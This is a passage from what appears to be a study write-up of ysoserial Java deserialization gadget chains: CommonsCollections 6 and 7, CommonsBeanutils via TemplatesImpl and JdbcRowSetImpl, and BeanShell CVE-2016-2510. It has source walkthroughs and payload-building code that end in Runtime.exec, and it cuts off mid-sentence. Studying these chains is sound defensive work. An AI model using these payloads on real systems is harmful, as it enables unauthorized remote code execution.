class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br>java.io.ObjectInputStream.readObject()<br>java.util.HashSet.readObject()<br>java.util.HashMap.put()<br>java.util.HashMap.hash()<br>org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()<br>org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()<br>org.apache.commons.collections.map.LazyMap.get()<br>org.apache.commons.collections.functors.ChainedTransformer.transform()<br>org.apache.commons.collections.functors.InvokerTransformer.transform()<br>java.lang.reflect.Method.invoke()<br>java.lang.Runtime.exec()<br></code></pre></td></tr></table></figure><p>In general, <code>TiedMapEntry</code>‘s <code>hashCode()</code> method would call <code>map.get(key)</code> and make a flaw for <code>LazyMap</code>. <code>HashMap</code>‘s <code>readObject()</code> calls <code>hashCode()</code> of key to calculate hash, which makes sense for the exploitation above.</p><p>Firstly, see <code>HashMap</code>‘s <code>readObject()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span>  <br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>  ...<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;  <br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>        <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();  <br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>        <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();  <br>    putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);  <br>&#125;<br>...<br>    <br></code></pre></td></tr></table></figure><p>Step into <code>hash()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;  <br>    <span class="hljs-type">int</span> h;  <br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);  <br>&#125;<br></code></pre></td></tr></table></figure><p>If key is a <code>TiedMapEntry</code>, then the common exploitation chain takes effect.</p><p>So the next step is to put a <code>TiedMapEntry</code> into hash map.<br>To avoid contaminating <code>LazyMap</code> during payload creation, <strong>we should not just call  <code>map.put</code> to insert node</strong>. In order to avoid calling <code>hash(entry)</code>, there are two alternative ways: by <code>putVal()</code> or directly inserting node into underlying hash table(later is what ysoserial does). Let’s reproduce the former way(<code>putVal</code>). </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();  <br><span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);  <br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;padishah&quot;</span>);  <br>  <br><span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();  <br><span class="hljs-type">Method</span> <span class="hljs-variable">putMethod</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br><span class="hljs-type">int</span> <span class="hljs-variable">JDK_VERSION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;  <br><span class="hljs-keyword">try</span> &#123;  <br>    putMethod = HashMap.class.getDeclaredMethod(<span class="hljs-string">&quot;putVal&quot;</span>, <span class="hljs-type">int</span>.class, Object.class, Object.class, <span class="hljs-type">boolean</span>.class, <span class="hljs-type">boolean</span>.class);  <br>    JDK_VERSION = <span class="hljs-number">8</span>;  <br>&#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;  <br>    putMethod = HashMap.class.getDeclaredMethod(<span class="hljs-string">&quot;addEntry&quot;</span>, <span class="hljs-type">int</span>.class, Object.class, Object.class, <span class="hljs-type">int</span>.class);  <br>    JDK_VERSION = <span class="hljs-number">7</span>;  <br>&#125;  <br>putMethod.setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> transformerChain.hashCode();<span class="hljs-comment">// a random hashcode  </span><br><span class="hljs-keyword">if</span> (JDK_VERSION == <span class="hljs-number">8</span>) &#123;  <br>    putMethod.invoke(map, hash, entry, <span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);  <br>&#125; <span class="hljs-keyword">else</span> &#123;  <br>    putMethod.invoke(map, hash, entry, <span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-number">0</span>);  <br>&#125;  <br>Reflections.setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);  <br><span class="hljs-keyword">return</span> map;<br></code></pre></td></tr></table></figure><p>^CC6-1<br>Note that, <code>HashMap</code> for JDK1.7 adds node in a different way from that of JDK1.8. JDK1.7 use <code>addEntry</code> in replacement of <code>putVal</code>.</p><h3 id="CommonCollections7-jdk1-8-1-7"><a href="#CommonCollections7-jdk1-8-1-7" class="headerlink" title="CommonCollections7 jdk1.8 1.7"></a>CommonCollections7 jdk1.8 1.7</h3><blockquote><p>[!NOTE] pre-requirements<br>JDK1.7 or 1.8, only reproduced on JDK1.8<br>commons-collections:commons-collections:3.2.1</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br>java.util.Hashtable.readObject  <br>java.util.Hashtable.reconstitutionPut  <br>org.apache.commons.collections.map.AbstractMapDecorator.equals  <br>java.util.AbstractMap.equals  <br>org.apache.commons.collections.map.LazyMap.get  <br>org.apache.commons.collections.functors.ChainedTransformer.transform  <br>org.apache.commons.collections.functors.InvokerTransformer.transform  <br>java.lang.reflect.Method.invoke  <br>sun.reflect.DelegatingMethodAccessorImpl.invoke  <br>sun.reflect.NativeMethodAccessorImpl.invoke  <br>sun.reflect.NativeMethodAccessorImpl.invoke0  <br>java.lang.Runtime.exec<br></code></pre></td></tr></table></figure><h4 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h4><p>This vulnerability exists in <code>Hashtable</code>‘s hash collision check progress which is part of <code>readObject()</code>. It will compare hash between the node to be inserted and each existing node. If their hash appears to be the same, then compare further using <code>equals()</code>. Both <code>hashCode()</code> and <code>equals()</code> are delegated to the node itself.<br><code>AbstractMap</code>(which is the super class of <code>HashMap</code>)’s <code>equals()</code> will call <code>that.get()</code>, that satisfies <code>LazyMap</code>‘s trigger condition.<br>It’s quite easy to spoof two <code>LazyMap</code> nodes that have the same hash but different keys. This is how this vul occurs.</p><h4 id="Exploit-chain"><a href="#Exploit-chain" class="headerlink" title="Exploit chain"></a>Exploit chain</h4><p>Firstly, see <code>Hashtable</code>‘s <code>readObject()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span>  <br>     <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException  <br>&#123;<br><span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;  <br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>        <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();  <br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  <br>        <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();  <br>    <span class="hljs-comment">// sync is eliminated for performance  </span><br>    reconstitutionPut(table, key, value);  <br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>Step into <code>reconstitutionPut()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span>  <br>    <span class="hljs-keyword">throws</span> StreamCorruptedException  <br>&#123;<br>...<br><span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();  <br><span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;  <br><span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;  <br>    <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();  <br>    &#125;  <br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>We should satisfy <code>e.hash==hash</code> to reach <code>equals(key)</code>. When using <code>LazyMap</code> to decorate <code>HashMap</code>, <code>equals()</code> will delegate to <code>AbstractMap</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>...<br>Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<br>...<br>Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();  <br><span class="hljs-keyword">while</span> (i.hasNext()) &#123;  <br>    Entry&lt;K,V&gt; e = i.next();  <br>    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> e.getKey();  <br>    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> e.getValue();  <br>    <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;  <br>        <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-literal">null</span> &amp;&amp; m.containsKey(key)))  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-keyword">if</span> (!value.equals(m.get(key)))  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>    &#125;  <br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>^CC7-01</p><p>If the input object <code>o</code> is a <code>LazyMap</code>, <code>m.get(key)</code> will trigger its transformers. By the way, even if a <code>LazyMap</code> does not have the key of another map, it’s still equivalent to that map(which can be any map), since it’s able to create the missing key and <code>get()</code> will always return a value. ^1b8389</p><h4 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h4><p>After understanding the routine, let’s construct the two <code>LazyMap</code>. First, look at the <code>hashCode()</code> of <code>LazyMap</code>, which delegates to <code>AbstractMapDecorator</code>, then delegates to the underlying map(here is <code>HashMap</code>), finally find it in its super class <code>AbstractMap</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();  <br>    <span class="hljs-keyword">while</span> (i.hasNext())  <br>        h += i.next().hashCode();  <br>    <span class="hljs-keyword">return</span> h;  <br>&#125;<br></code></pre></td></tr></table></figure><p>Consider a <code>LazyMap</code> with single entry: <code>&quot;aa&quot;: 1</code>, its hash code should equals to <code>&quot;aa&quot;.hashCode()</code>. Step into <code>String#hashCode</code>, its document says:</p><blockquote><p>Returns a hash code for this string. The hash code for a String object is computed as:<br>s[0]*31^(n-1) + s[1]*31^(n-2) + … + s[n-1]</p><p>using int arithmetic, where s[i] is the ith character of the string, n is the length of the string, and ^ indicates exponentiation. (The hash value of the empty string is zero.)</p></blockquote><p><code>&quot;ab&quot;.hashCode()</code> is calculated as <code>&#39;a&#39;*31 + &#39;b&#39;</code>. It’s easy to find a collision. Abstract the hash code of two-character string to <code>x*31 + y</code>, which is equals to <code>(x+1)*31 + (y-31)</code>, so one of the equivalences of <code>&quot;ab&quot;</code> is <code>&quot;bC&quot;</code> .</p><h4 id="Write-payload"><a href="#Write-payload" class="headerlink" title="Write payload"></a>Write payload</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();  <br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();  <br><span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer1);  <br><span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer1);  <br>lazyMap1.put(<span class="hljs-string">&quot;ab&quot;</span>, <span class="hljs-number">1</span>);  <br>lazyMap2.put(<span class="hljs-string">&quot;bC&quot;</span>, <span class="hljs-number">1</span>);  <br>  <br><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();  <br>hashtable.put(lazyMap1, <span class="hljs-number">1</span>);  <br>hashtable.put(lazyMap2, <span class="hljs-number">1</span>);  <br>  <br>Reflections.setFieldValue(chainedTransformer1, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);  <br>  <br>lazyMap2.remove(<span class="hljs-string">&quot;ab&quot;</span>);<br><br><span class="hljs-keyword">return</span> hashtable;<br></code></pre></td></tr></table></figure><p>Note that, while put <code>lazyMap2</code> into hash table, we can see in [[Java Deserialize Vulnerabilities ysoserial study#^CC7-01|this code block]] that <code>lazyMap2.get(&quot;ab&quot;)</code> would be called in <code>equals()</code>, so we should remove this redundant entry. To ensure <code>lazyMap2.get(&quot;ab&quot;)</code> is not equal to that of <code>lazyMap1</code>, we decorate <code>lazyMap2</code> with a transformer that will not return <code>1</code>(an empty chain, will get <code>ab: ab</code>).</p><p>End.</p><hr><h2 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h2><blockquote><p>[!NOTE] pre-requirements<br>JDK1.8<br>commons-beanutils:commons-beanutils:1.9.2<br>commons-collections:commons-collections:3.1<br>commons-logging:commons-logging:1.2</p></blockquote><h3 id="Using-TemplatesImpl-CB1-CB2"><a href="#Using-TemplatesImpl-CB1-CB2" class="headerlink" title="Using TemplatesImpl (CB1 CB2)"></a>Using TemplatesImpl (CB1 CB2)</h3><p><code>TemplatesImpl</code> has an property named <code>_outputProperties</code> whose getter is <code>getOutputProperties()</code> according to java bean naming principle. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title function_">getOutputProperties</span><span class="hljs-params">()</span> &#123;   <br><span class="hljs-keyword">try</span> &#123;  <br>    <span class="hljs-keyword">return</span> newTransformer().getOutputProperties();  <br>&#125;  <br><span class="hljs-keyword">catch</span> (TransformerConfigurationException e) &#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <br>&#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>In this method, the method <code>newTransformer()</code> is called, which serves as an entry to executing arbitrary code([[Java Deserialize Vulnerabilities ysoserial study#TemplatesImpl exploit|here]]).<br>The class <code>BeanComparator</code> in <code>commons-beanutils</code> project is disclosed for triggering this flaw in the deserialization procession.<br>In its <code>compare()</code> method:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">( T o1, T o2 )</span> &#123;  <br>   ...<br><span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty( o1, property );  <br><span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty( o2, property );<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>In <code>getSimpleProperty()</code> method:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getSimpleProperty</span><span class="hljs-params">(Object bean, String name)</span>&#123;<br>...<br><span class="hljs-type">PropertyDescriptor</span> <span class="hljs-variable">descriptor</span> <span class="hljs-operator">=</span>  <br>        getPropertyDescriptor(bean, name);  <br><span class="hljs-keyword">if</span> (descriptor == <span class="hljs-literal">null</span>) &#123;  <br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchMethodException</span>(<span class="hljs-string">&quot;Unknown property &#x27;&quot;</span> +  <br>            name + <span class="hljs-string">&quot;&#x27; on class &#x27;&quot;</span> + bean.getClass() + <span class="hljs-string">&quot;&#x27;&quot;</span> );  <br>&#125;  <br><span class="hljs-type">Method</span> <span class="hljs-variable">readMethod</span> <span class="hljs-operator">=</span> getReadMethod(bean.getClass(), descriptor);  <br><span class="hljs-keyword">if</span> (readMethod == <span class="hljs-literal">null</span>) &#123;  <br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchMethodException</span>(<span class="hljs-string">&quot;Property &#x27;&quot;</span> + name +  <br>            <span class="hljs-string">&quot;&#x27; has no getter method in class &#x27;&quot;</span> + bean.getClass() + <span class="hljs-string">&quot;&#x27;&quot;</span>);  <br>&#125;  <br>  <br><span class="hljs-comment">// Call the property getter and return the value  </span><br><span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);<br>...<br><br>&#125;<br></code></pre></td></tr></table></figure><p>In this method, firstly it creates a <code>PropertyDescriptor</code> of the input bean and gets the getter according to the property name. When the getter is invoked, our <code>TemplatesImpl</code> is ignited.</p><p>Poc:<br>Note that, set the <code>property</code> member of <code>BeanComparator</code> to  <code>lowestSetBit</code> so as to successfully add initial value to queue. You can also set it to null.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);  <br><span class="hljs-comment">// mock method name until armed  </span><br><span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;lowestSetBit&quot;</span>);<span class="hljs-comment">// or null</span><br>  <br><span class="hljs-comment">// create queue with numbers and basic comparator  </span><br><span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);  <br><span class="hljs-comment">// stub data for replacement later  </span><br>queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;1&quot;</span>));  <br>queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;1&quot;</span>));  <br>  <br>Reflections.setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);  <br>Reflections.setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);  <br>  <br><span class="hljs-keyword">return</span> queue;<br></code></pre></td></tr></table></figure><h3 id="Using-JdbcRowSetImpl-CB3"><a href="#Using-JdbcRowSetImpl-CB3" class="headerlink" title="Using JdbcRowSetImpl (CB3)"></a>Using JdbcRowSetImpl (CB3)</h3><p>The <code>JdbcRowSetImpl</code> class has a property named <code>databaseMetaData</code> whose getter calls <code>connect()</code> to look up a JNDI URL.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> DatabaseMetaData <span class="hljs-title function_">getDatabaseMetaData</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;  <br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> connect();  <br>    <span class="hljs-keyword">return</span> con.getMetaData();  <br>&#125;<br></code></pre></td></tr></table></figure><p>Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;lowestSetBit&quot;</span>);  <br><span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">rs</span>         <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();  <br>rs.setDataSourceName(jndiURL);  <br>rs.setMatchColumn(<span class="hljs-string">&quot;xx&quot;</span>);  <br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);  <br>  <br>queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;1&quot;</span>));  <br>queue.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;1&quot;</span>));  <br>  <br>Reflections.setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;databaseMetaData&quot;</span>);  <br>Reflections.setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;rs, rs&#125;);  <br><span class="hljs-keyword">return</span> queue;<br></code></pre></td></tr></table></figure><hr><h2 id="BeanShell"><a href="#BeanShell" class="headerlink" title="BeanShell"></a>BeanShell</h2><h3 id="BeanShell1-CVE-2016-2510"><a href="#BeanShell1-CVE-2016-2510" class="headerlink" title="BeanShell1  CVE-2016-2510"></a>BeanShell1  <a href="https://github.com/advisories/GHSA-gxg6-rc6c-v673" title="CVE-2016-2510">CVE-2016-2510</a></h3><blockquote><p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8<br>org.beanshell:bsh:2.0b5 (fixed in 2.0b6)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Gadget chain:</span><br>invokeMethod:<span class="hljs-number">233</span>, This (bsh)<br>invokeMethod:<span class="hljs-number">174</span>, This (bsh)<br>invokeImpl:<span class="hljs-number">194</span>, XThis$Handler (bsh)<br>invoke:<span class="hljs-number">131</span>, XThis$Handler (bsh)<br>compare:-<span class="hljs-number">1</span>, $Proxy5 (com.sun.proxy)<br>siftDownUsingComparator:<span class="hljs-number">721</span>, PriorityQueue (java.util)<br>siftDown:<span class="hljs-number">687</span>, PriorityQueue (java.util)<br>heapify:<span class="hljs-number">736</span>, PriorityQueue (java.util)<br>readObject:<span class="hljs-number">796</span>, PriorityQueue (java.util)<br></code></pre></td></tr></table></figure><p>Firstly, let’s take a glance into <code>bsh.XThis</code>. It has a member named by <code>invocationHandler</code> with 